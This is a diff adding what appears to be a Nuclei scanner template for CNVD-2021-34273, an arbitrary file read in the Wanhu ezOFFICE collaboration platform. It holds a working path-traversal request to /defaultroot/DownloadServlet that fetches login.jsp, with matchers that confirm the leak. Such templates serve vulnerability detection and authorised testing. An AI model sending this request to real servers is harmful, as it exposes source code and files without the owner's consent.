@@ -1,0 +1,29 @@
+http:
+    - matchers:
+        - type: word
+          words:
+            - localeCode=request.getParameter("localeCode")
+        - type: word
+          words:
+            - logobgSaveNameArr
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /defaultroot/DownloadServlet?modeType=2&path=html&FileName=..\..\login.jsp&name=123&fiewviewdownload=2&cd=inline&downloadAll=2 HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+id: CNVD-2021-34273
+info:
+    author: SleepingBag945
+    description: 万户ezOFFICE协同管理平台存在任意文件下载漏洞。攻击者可利用漏洞下载任意文件。
+    name: wanhu-oa download servlet arbitrary file read
+    reference:
+        - http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20DownloadServlet%20任意文件读取漏洞.html
+    severity: high
+    tags:
+        - wanhu
+        - 万户oa
+        - Servlet
